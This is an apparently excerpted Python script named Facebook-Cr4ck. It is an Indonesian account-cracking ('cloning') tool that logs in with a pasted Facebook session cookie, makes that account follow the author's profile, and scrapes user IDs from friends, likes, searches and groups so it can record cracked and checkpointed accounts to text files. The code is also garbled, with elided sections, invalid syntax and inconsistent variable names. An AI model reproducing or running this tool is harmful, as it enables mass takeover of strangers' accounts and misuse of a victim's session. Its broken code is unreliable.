#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#Males gw encrypt Jing Kalo mau recode, recode Ajh
#Tapi ngotak dikit jangan Lo jual belikan script ini Anjg
#Code by Satriaofficial 
#Created 26-11-2022
#My facebook (https://www.facebook.com/Enang.Official)
...
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : Satriaofficial
\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Facebook-Cr4ck
\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/Enang.Official
\x1b[1;94m────────────────────────────────────────────────────""")
...
\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : SatriaOfficial
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/Facebook-Cr4ck
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/Enang.Official
\x1b[1;94m────────────────────────────────────────────────────""")

def satriaofficial():
    yayan=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
    if satria == "": 
       os.system("python Facebook-Cr4ck.py")
    else:
       sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood night :')")
def satria_enang():
    time.sleep(0.1)
    print("\033[97m [\033[96m01\033[97m] Start  Cloning ID")
    print("\033[97m [\033[96m02\033[97m] Tutor  How To Get Fb Cookies")
    print("\033[97m [\033[96m03\033[97m] Joined Grup Fb ❤️ 《Dewa Error》 ❤️")
    print("\033[97m [\033[96m04\033[97m] Joined Grup S　t　o　r　yツ")
    print("\033[97m [\033[96m05\033[97m] Update Tools")
    print("\033[97m [\033[91m00\033[97m] Keluar")
    print("\x1b[1;94m────────────────────────────────────────────────────")
    time.sleep(0.1)

    Satria=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
    if yayan == "1" or satria =="01":
         ...
         def masuk():
             try:
                   ...
                   print('\n\033[97m [\033[92m+\033[97m] \033[92mMohon Nunggu Bentar Deck...')
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Kenapa Dipikirin Ayo Dong Masuk" in Allstar(Semua Mulai):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[1;97m[\033[1;94m•\033[1;97m] \033[00mGanti bahasa Dulu, harap tunggu\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(Semua Mulai,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/ENANG.OFFICIAL"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                  ...
                  os.system("xdg-open https://youtube.com/@Satria.Tutorial") 
         ...
         def getlike(react):
             ...
             if 'Liat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Liat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             ...
             for user in users:
                  ...
                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
             if "Liat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Liat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             ...
             for user in users:
                 ...
                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
             if "Liat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Liat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ...
                   ikeh_ikeh_kimochi()
                   Bangsat()
                   uhhh('\033[1;97m [\033[1;92m01\033[1;97m] Cloning From ID Friend')
                   aahh('\033[1;97m [\033[1;92m02\033[1;97m] Cloning From ID Link Posting')
                   uuhh('\033[1;97m [\033[1;92m03\033[1;97m] Cloning From ID Search Name')
                   aahh('\033[1;97m [\033[1;92m04\033[1;97m] Cloning From ID Group ')
                   uuhh('\033[1;97m [\033[1;92m05\033[1;97m] Cloning From ID Publicks ')
                   aahh('\033[1;97m [\033[1;92m06\033[1;97m] View Cloning Results')
                   uuhh('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
                   ...
                   if memek =="":
                         ...
                         satriaofficial()
                   elif kontol == '1' or itil =='01':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Friend')
                         username = getid(mbasic.format(url["href"]))
                   elif kontol == '2' or itil =='02':
                         ...
                         try:
                                 file1 = open("chenkpoint.txt").read()
                                 ...
                                 for x in result:
                                         with open('ok.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('chenkpoint.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Cloning Done....")
                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Saved To \033[1;93mcp.txt\033[96m|\033[1;92tod.txt")
                         except FileNotFoundError:
    ...
    elif yayan == "2" or satria =="02":
         os.system("xdg-open https://youtube.com/@Satria.Tutorial") 
         satriaofficial()
    elif yayan == "3" or satria =="03":
         os.system('xdg-open https://www.facebook.com/groups/2387508118208619')
         satriaofficial()
    elif satria == "4" or satria =="04":
         os.system('xdg-open https://www.facebook.com/groups/2387508118208619')
         satriaofficial()
    elif satria == "5" or satria =="05":
